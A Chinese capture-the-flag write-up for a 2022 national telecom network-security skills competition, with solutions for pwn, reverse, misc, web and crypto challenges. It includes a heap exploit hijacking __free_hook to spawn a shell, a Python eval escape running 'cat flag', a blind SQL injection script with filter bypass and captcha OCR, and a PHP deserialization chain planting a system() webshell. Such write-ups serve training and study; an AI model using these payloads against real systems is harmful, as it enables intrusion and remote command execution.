# 2022年第三届电信和互联网行业职业技能竞赛暨第十一届信息通信网络安全管理员职业技能竞赛全国选拔赛WriteUp

> 原文: https://www.ctfiot.com/61661.html
> ID: 61661

PART

01

PWN

PART

02

Reverse

内联了一坨库函数，看不懂，直接调试器找flag。

我们这里输入123123123，发现最后xor的时候输入的内容被反转成321321321，然后再做xor 0x70，这里程序基地址如下：

输入123123123，我们断在xor的位置，看看内存如下：

Flag被反转：

Xor后的每位在0xf6bb0e函数中存储到新的位置，新的字符串对象在ecx参数中，buffer在ecx+4的位置中，也就是0x00b96828这个地址，ecx+8为buffer结束地址：

在所有flag反转后我们再次看看这个内存的内容：

看样子的确是xor 0x70后的内容，然后我们看比较函数0xf67815，根据猜想第二个参数就是buffer内容，不过是运行后初始化的，地址在0x10c3248中：

根据上面的猜想，buffer在0xb966f0中，我们看看里面内容，感觉这部分0x20长度就是反转的flag值：

写个脚本xor一下，没想到还真是flag内容：

PART

03

MISC

在没有key时有长度限制，输入1进入calc，因为会调用print(eval(line))，所以直接输入key即可取得key变量的实际值。

进入2:

输入key，之后利用import导入os模块执行命令即可。

__import__(‘os’).popen(‘cat flag’).read()

1.binwalk 分离 jpg 得到 zip 压缩包

2.crc 碰撞 zip 压缩包内的小文件得到解压密码 ohhhh_you_found_me

3.解压 key.txt base64 解码，得到密码；将图片丢 SilentEye 解密得到 flag

PART

04

WEB

func.php处测试后发现出现sql注入常用的关键字会报error，大概率是sql注入。

但这里有一个验证码卡着，找了个第三方库 ddddocr来识别。

利用异或，如：

1’^(ascii(substr(database(),{0},1))={1})^’1

可以绕过过滤，成功注出来数据库名ctf，版本号5.7，但这里过滤select，低版本又没法用table xxx来注入，但这里可以通过修改database()为id判断出来该字段是否存在，结合题目给出的信息前后尝试了name、flag、authcode等字段均失败，尝试code字段时发现成功注出数据，得到flag:

EzPop

挖一条利用链即可，这题一血

EXP:

超级马里奥

js里面藏了通关后的flag路径。

访问后解码即为flag。

PART

05

CRYPTO

爆破X0，为4或者5，恢复key，解密第一段密文得到部分flag，第一段密文做key，解密第二段密文得到剩下flag。

临时密钥重用恢复私钥，copper恢复低位。

old_rsa

构造式子，利用费马小定理分解moduls，得到s，再根据p,q关系，给n/s开根来分解n，解rsa 。


```
# coding:utf8
from pwn import *

context.log_level = True
libc=ELF('./libc.so.6')

#p = process('./pwn')
#p=process('./pwn',env={'LD_PRELOAD':'./libc.so.6'})
p = remote('1.14.97.218',21969)
#gdb.attach(p,'b *0x8084000')

def add():
 p.recvuntil("4.show")
 p.sendline("1")

def edit(x,y):
 p.recvuntil("4.show")
 p.sendline("2")
 p.recvuntil("index:")
 p.sendline(str(x))
 p.recvuntil("content:")
 p.sendline(y)

def show(x):
 p.recvuntil("4.show")
 p.sendline("4")
 p.recvuntil("index:n")
 p.sendline(str(x))

def delete(x):
 p.recvuntil("4.show")
 p.sendline("3")
 p.recvuntil("index:")
 p.sendline(str(x))

p.recvuntil('name')

p.sendline('/bin/shx00')
p.recvuntil('password')#

p.sendline('aaaaa')
p.recvuntil('email')

p.sendline('aaaaa')
p.recvuntil('essages?n')

p.sendline('y')

show(-2)

leak=u64(p.recv(6).ljust(8,'x00'))
libcbase=leak-(0x7ffff79d9350-0x00007ffff79e2000)

show(-83)
leak=u64(p.recv(6).ljust(8,'x00'))

add()
edit(0,'/bin/shx00')
#edit(-83,p64(free)*2)
edit(-83,p64(leak-0x98)+p64(leak))

show(-83)
leak=u64(p.recv(6).ljust(8,'x00'))
libcbase=leak-libc.sym['free']

#edit(-82,p64(system)*2)
free=libcbase+libc.sym['__free_hook']
system=libcbase+libc.sym['system']
print hex(libcbase)
edit(-82,p64(free)*2)
edit(-82,p64(system)*2)

#gdb.attach(p,"b *(0x0000555555554000+0x0Dad)nb *(0x0000555555554000+0xd7e)")
#pause()

#delete(0)

p.interactive()
```



```
int __cdecl main_0(int argc, const char **argv, const char **envp)
{
char Str1[264]; // [esp+190h] [ebp-210h] BYREF
char Src[260]; // [esp+298h] [ebp-108h] BYREF

__CheckForDebuggerJustMyCode(&unk_543015);
j__memset(Src, 0, 0x100u);
sub_459BEA("Plz input the flag: ");
sub_45B6C0("%s", Src);
sub_460FE0(Str1, 0x100u, Src, 0x100u);
sub_45C250(Str1);
if ( !j__strcmp(Str1, "v1t4t{x6tltut{CltT2nOEilMUhVS11ut{inOkGlOUOjO11ZOR@#") )
{
 sub_459BEA("Congratulation! This encryption is too easy for you.nn");
 sub_459BEA("Flag is flag{%s}");
}
else
{
 sub_459BEA("sorry, wrong flag~n");
}
return 0;
}
errno_t __cdecl sub_460880(char *Destination)
{
char Source[264]; // [esp+D0h] [ebp-144h] BYREF
unsigned int v3; // [esp+1D8h] [ebp-3Ch]
unsigned int v4; // [esp+1E4h] [ebp-30h]
size_t v5; // [esp+1F0h] [ebp-24h]
unsigned int i; // [esp+1FCh] [ebp-18h]
int v7; // [esp+208h] [ebp-Ch]

__CheckForDebuggerJustMyCode(&unk_543015);
j__memset(Source, 0, 0x100u);
v5 = j__strlen(Destination);
v4 = v5 / 3;
v3 = v5 % 3;
v7 = 0;
for ( i = 0; i < 3 * v4; i += 3 )
{
 Source[v7] = dword_53F000 + aAbcdefghijklmn[(Destination[i] & 0xFC) >> 2];
 Source[v7 + 1] = dword_53F000 + aAbcdefghijklmn[(Destination[i + 1] >> 4) | (16 * (Destination[i] & 3))];
 Source[v7 + 2] = dword_53F000
                + aAbcdefghijklmn[((Destination[i + 2] & 0xC0) >> 6) | (4 * (Destination[i + 1] & 0xF))];
 Source[v7 + 3] = dword_53F000 + aAbcdefghijklmn[Destination[i + 2] & 0x3F];
 v7 += 4;
}
if ( v3 == 2 )
{
 Source[4 * v4] = dword_53F000 + aAbcdefghijklmn[(Destination[3 * v4] & 0xFC) >> 2];
 Source[4 * v4 + 1] = dword_53F000
                    + aAbcdefghijklmn[(Destination[3 * v4 + 1] >> 4) | (16 * (Destination[3 * v4] & 3))];
 Source[4 * v4 + 2] = dword_53F000 + aAbcdefghijklmn[4 * (Destination[3 * v4 + 1] & 0xF)];
 Source[4 * v4 + 3] = 64;
}
if ( v3 == 1 )
{
 Source[4 * v4] = dword_53F000 + aAbcdefghijklmn[(Destination[3 * v4] & 0xFC) >> 2];
 Source[4 * v4 + 1] = dword_53F000 + aAbcdefghijklmn[16 * (Destination[3 * v4] & 3)];
 Source[4 * v4 + 2] = 64;
 Source[4 * v4 + 3] = 35;
}
return j__strcpy_s(Destination, 0x100u, Source);
}
.data:0053F006 00 db 0
.data:0053F007 00 db 0
.data:0053F008 41 42 43 44 45 46 47 48 49 4A+aAbcdefghijklmn db 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',0
t:00460EF5 68 08 70 51 00 push offset aCongratulation ; "Congratulation! This encryption is too "...
.text:00460EFA E8 EB 8C FF FF call sub_459BEA
.text:00460EFA
.text:00460F18 68 64 70 51 00 push offset aSorryWrongFlag ; "sorry, wrong flag~n"
.text:00460F1D E8 C8 8C FF FF call sub_459BEA
.text:00460F1D
.text:00460F22 83 C4 04
```



```
if ( !j__strcmp(Str1, "v1t4t{x6tltut{CltT2nOEilMUhVS11ut{inOkGlOUOjO11ZOR@#") )
{
printf("Congratulation! This encryption is too easy for you.nn");
```



```
str="v1t4t{x6tltut{CltT2nOEilMUhVS11ut{inOkGlOUOjO11ZOR"
str2=''
for i in range(len(str)):
str2+=chr(ord(str[i])-1)
print(str2)
```



```
def supper_calc():
 print("Please enter the invitation code")
 code = input(" >>> ")
 if(code == key):
     line = input(" >>> ")
     try:
         print(eval(line))
     except:
         pass
 else:
     print("403 Forbiddenn")
```



```
import ddddocr
import requests
import re
import json

session = requests.session()
ocr = ddddocr.DdddOcr()

def getCode():
 r = session.get("http://80.endpoint-d49eaafbd9d1480a8ac98033a1d5763a.dasc.buuoj.cn:81")
 code = re.findall(r'./pic/(.*?).jpg',r.text)
 return code[0]
headers  = {
 'Content-Type':'application/json'
}
url = "http://80.endpoint-d49eaafbd9d1480a8ac98033a1d5763a.dasc.buuoj.cn:81/func.php"

data = { 
     "name": "1'^^'1", 
     "authcode":"%s"%(getCode())
     }
r = session.get(url = url,headers=headers,json=data)

# print("[-]"+r.text)

chars = '.,abcdefghijklmnopqrstuvwxyz-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ{}_!@#$%^&*()'
res = ""
#循环
for i in range(1,300):
for c in chars:
 data = { 
         #"name": "1'^(ascii(substr(database(),{0},1))={1})^'1".format(i,ord(c)), 
         # "name": "1'^(ascii(substr(version(),{0},1))={1})^'1".format(i,ord(c)), 
         "name": "1'^(ascii(substr(code,{0},1))={1})^'1".format(i,ord(c)), 
         "authcode":"%s"%(getCode())
         }
 # print(data)
 r = session.get(url = url,headers=headers,json=data)
 if "成功" not in r.text:
     res = res + (c)
     print("[+]:"+res)
     break
```



```
<?php

class a
{
private $_path;
private $_keys = array('a');
public function __construct($a){
     $this->_path =$a;
}
}
class b
{
private $value;
private $util;
public function __construct(){
      $this->util = new c();
      $this->value=new e(new e);
 }
}
class c
{
protected $container;
protected $extensions = [];
public function __construct(){
     $this->extensions=['y'=>"evil@load"];
     $this->container = new d();
 }
}
class d
{
protected $default;
public function __construct(){
 $this->default = new evil;
}
}
class e
{
 protected $config;
 protected $code;
 public function __construct(){
     $this->config = new d;
     $this->code = "?><?=system($_GET[0]);?>";
 }
}
class evil
{
}
$o = new a(new  b());
echo urlencode(serialize($o));
```



```
from Crypto.Cipher import AES

def f(x):
 return (x-2)**3

def fd(x):
 return 3*((x-2)**2)

def newtonMethod(n,assum):
 time = n
 x = assum
 a = f(x)
 b = fd(x)
 if f(x) == 0.0:
     return time,x
 else:
     next = x-a/b

 if a - f(next)<1e-6:
     key = str(x)[-16:] * 2
     return key
 else:
     return newtonMethod(n+1,next)

with open("flag_cipher","rb") as ff:
 data = ff.read()
print(len(data))
plain = data
cipher_arr = [plain[i:i + 32] for i in range(0, len(plain), 32)]
#print(cipher_arr)
for i in range(1,len(cipher_arr)):
 cipher = AES.new(cipher_arr[i - 1], AES.MODE_ECB)
 flag = cipher.decrypt(cipher_arr[i])
 print(flag)

for i in range(3,100):
 key = (newtonMethod(0,i)).encode()
 cipher = AES.new(key, AES.MODE_ECB)
 if b"flag" in cipher.decrypt(cipher_arr[0]):
     print(cipher.decrypt(cipher_arr[0]))
     break
```



```
from Crypto.Util.number import *
n=0xFFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123
a='d9747f1d1274200cb72b378a55282d2eff811476ce5d197422201fce03a7a7a8e31d0e1200602a13a3d3051b8fcec6096b8e182db614f248364cfa90566aeeb6'
b='d7762c4963dfebb721e2be9024e389b388b3a4d069964375f871ae5c14aad8f6df9af4b9571d5120027ca2553a057382f54e834225c2691488d2ce49c7258d99'
R1 = int(a[:64],16)
S1 = int(a[64:],16)

R2 = int(b[:64],16)
S2 = int(b[64:],16)
d = (R1-R2) * inverse((S1+R1)-(S2+R2),n) % n
print(long_to_bytes(d))

c =  2217344750798236287989923271111493621814821232365781784992845921175835939916080255971267802993897386183080504406849487970548937348304569582798336704291413362485808165972480022302292463614365892149324677003706817975871653875892621395157463049066727487824595070529224326645861
n =  63916398739042244969298556913752866927345103091746531832160172776924327621386275688870376773848098753349049481579609776026424552613871689909239611712050170593399119845564628346168861169308355368322234316835673432583400422883895605822047092249278927145442473528410586074407793529865400676962006885370537237931

m = d << ((38-29)*8)
R.<x> = Zmod(n)[]
f = (m+x)^3-c
x0 = f.small_roots(X = 2^73,beta=1.0)[0]
print(long_to_bytes(int(m+x0)))
```



```
from Crypto.Util.number import *
from gmpy2 import *

m=116941485899739414251246493958967874742415513846968281837378288831475464995719404152091075807703703760161668322019688982322412858360298083282048016471992123119552191949625744302794734654982515723682468004192643302008596057484501049720252388076140663072280259944977586770036943918323021072470911079493226313697
b=91041526062781396675574082041815446314410552016418445701004242683667869676848123024367774995203600611119957293225026645346203653802571506251684604062346200933340300129295136896646359711755714648298657518372585375015045404872078958485848935979665236277021700992880676826271417439332311101083177193741663386099
c=92594257988365592777028699793836140730684622462726220412156676461309948678172050081165874808863599038381096168577254936401425797323220583814318899370731701762780581469400295511158510006075517683261016562483393650444826215681626148360146964176490292444573137474880626257215229939212886462311681798874995691447
e=0x10001
c2 = pow(2,e,m)
p = (gcd(pow(c2,b,m)-4*c2**3,m))
q = m//p
d = inverse(e,(p-1)*(q-1))
s = (pow(c,d,m))
print(s.bit_length())
print(s)

n=1482444389457404899953084837060042280939883408614313139578607280422374922156514156385314616622296931553923035789958736205374357636892762829568311165269157956745915924810666972019486228517724515343075265010635121443768084477404422375154618653587421421837643244813991284251059241954997493254964957535996806034198351472551681194390836009564115416248393420270109855545655643004736639566915764631797596326925718879281510688918780806062170637134169102298792149144748873
e=65537
c=1107630099074013951642697098127101216150362682085100985894676481209455731698731382175860564514936311013971379909226938044342189587323180278308960128654206583969129957682145946225069058626756311413830528885675903729310664829961744853950936939594979769289884314729722609779726563212667560448377262134007794653441879381478346622039273986090620719468253177937312924024797904813171130391347635494964065515113515059974143395377009897456131595319224232573267520996519331
     # P = getPrime(bits >> 1)
     # c = getPrime(bits >> 2)
     # Q = s * P + c + 1
pbar = (iroot(n//s,2))[0]
p = pbar
q = n // p
d = inverse(e,(p-1)*(q-1))
s = (pow(c,d,n))
print(long_to_bytes(s))
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/6-1665407142.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/1-1665407143.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/2-1665407143.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/6-1665407144.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/5-1665407145.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/7-1665407145.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/5-1665407146.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/6-1665407146.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/5-1665407146.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/10/6-1665407147.jpeg)